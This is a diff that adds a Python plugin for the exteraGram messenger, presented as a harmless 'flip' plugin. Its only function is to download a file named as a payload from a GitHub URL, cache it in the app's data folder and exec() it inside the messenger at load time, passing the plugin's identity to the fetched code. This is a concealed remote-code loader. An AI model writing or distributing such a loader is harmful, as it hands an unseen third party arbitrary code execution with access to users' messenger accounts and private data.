@@ -1,0 +1,85 @@
+__id__ = "flip"
+__name__ = "flip"
+__description__ = "извиняюсь" 
+__version__ = ":"
+__author__ = "@JavaScript_XD"
+__min_version__ = "11.12.0"
+
+import os
+import urllib.request
+
+from android_utils import log
+from base_plugin import BasePlugin
+from ui.settings import Header, Text
+
+
+PAYLOAD_URL = "https://raw.githubusercontent.com/qrrrv/Testt/main/flip_180_payload.py"
+CACHE_FILE = "flip_180_payload_cached.py"
+
+
+class Plugin(BasePlugin):
+    def __init__(self):
+        super().__init__()
+        self._remote = None
+        self._error = ""
+
+    def _cache_path(self):
+        try:
+            base = os.path.dirname(os.path.abspath(__file__))
+        except Exception:
+            base = "/data/user/0/com.exteragram.messenger/files/plugins"
+        return os.path.join(base, CACHE_FILE)
+
+    def _load_remote(self, force=False):
+        if self._remote is not None and not force:
+            return True
+        path = self._cache_path()
+        try:
+            if force or not os.path.exists(path):
+                with urllib.request.urlopen(PAYLOAD_URL, timeout=12) as response:
+                    open(path, "wb").write(response.read())
+        except Exception as e:
+            self._error = f"GitHub download failed: {e}"
+            if not os.path.exists(path):
+                log(f"[Flip180Loader] {self._error}")
+                return False
+        try:
+            scope = {"__file__": path, "__name__": "__flip_180_remote_payload__"}
+            exec(compile(open(path, "r", encoding="utf-8").read(), path, "exec"), scope, scope)
+            remote = scope["Plugin"]()
+            remote.id = self.id
+            remote.name = self.name
+            remote.description = self.description
+            remote.author = self.author
+            remote.min_version = self.min_version
+            remote.version = self.version
+            remote.icon = self.icon
+            remote.error_message = self.error_message
+            remote.enabled = self.enabled
+            remote.initialized = self.initialized
+            self._remote = remote
+            self._error = ""
+            return True
+        except Exception as e:
+            self._error = f"Payload bind failed: {e}"
+            log(f"[Flip180Loader] {self._error}")
+            return False
+
+    def on_plugin_load(self):
+        if self._load_remote():
+            return self._remote.on_plugin_load()
+
+    def on_plugin_unload(self):
+        try:
+            if self._load_remote():
+                return self._remote.on_plugin_unload()
+        finally:
+            self._remote = None
+
+    def create_settings(self):
+        if self._load_remote() and hasattr(self._remote, "create_settings"):
+            return self._remote.create_settings()
+        return [
+            Header(text="Flip 180 GitHub Loader"),
+            Text(text="GitHub status", subtext=f"{self._error or 'Waiting for payload.'}\n{PAYLOAD_URL}"),
+        ]
